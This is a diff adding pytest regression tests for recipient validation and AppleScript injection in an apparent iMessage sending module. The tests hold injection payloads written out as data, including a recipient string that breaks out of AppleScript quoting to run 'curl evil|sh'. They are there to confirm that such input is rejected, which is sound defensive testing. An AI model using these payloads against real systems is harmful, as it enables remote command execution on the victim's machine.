@@ -106,3 +106,56 @@ def test_poll_skips_own_messages(tmp_path: Path) -> None:
         chat_identifier="+15551234567",
     )
     assert len(messages) == 0
+
+
+def test_is_valid_imessage_recipient() -> None:
+    from openjarvis.channels.imessage_daemon import is_valid_imessage_recipient
+
+    # Legitimate handles.
+    assert is_valid_imessage_recipient("+15551234567")
+    assert is_valid_imessage_recipient("5551234567")
+    assert is_valid_imessage_recipient("alice@example.com")
+    assert is_valid_imessage_recipient("bob.smith+tag@mail.co.uk")
+    # AppleScript breakout / malformed handles must be rejected.
+    assert not is_valid_imessage_recipient(
+        'x" of targetService\ndo shell script "id"\n--'
+    )
+    assert not is_valid_imessage_recipient('a@b.com" & (do shell script "id")')
+    assert not is_valid_imessage_recipient("")
+    assert not is_valid_imessage_recipient("has space")
+
+
+def test_send_imessage_rejects_injection_recipient(monkeypatch) -> None:
+    """An attacker-influenced recipient must never reach ``osascript`` —
+    regression for AppleScript/shell command injection."""
+    import openjarvis.channels.imessage_daemon as d
+
+    def _fail_run(*args, **kwargs):
+        raise AssertionError("osascript must not run for an invalid recipient")
+
+    monkeypatch.setattr(d.subprocess, "run", _fail_run)
+
+    payload = '+1" of targetService\ndo shell script "curl evil|sh"\nset z to participant "x'
+    assert d.send_imessage(payload, "hello") is False
+
+
+def test_send_imessage_escapes_and_addresses_valid_recipient(monkeypatch) -> None:
+    import openjarvis.channels.imessage_daemon as d
+
+    captured: dict = {}
+
+    class _Result:
+        returncode = 0
+        stderr = ""
+
+    def _fake_run(cmd, **kwargs):
+        captured["cmd"] = cmd
+        return _Result()
+
+    monkeypatch.setattr(d.subprocess, "run", _fake_run)
+
+    assert d.send_imessage("+15551234567", 'hi "there"') is True
+    script = captured["cmd"][2]
+    # Recipient is the validated handle; message body has its quotes escaped.
+    assert 'participant "+15551234567"' in script
+    assert '\\"there\\"' in script
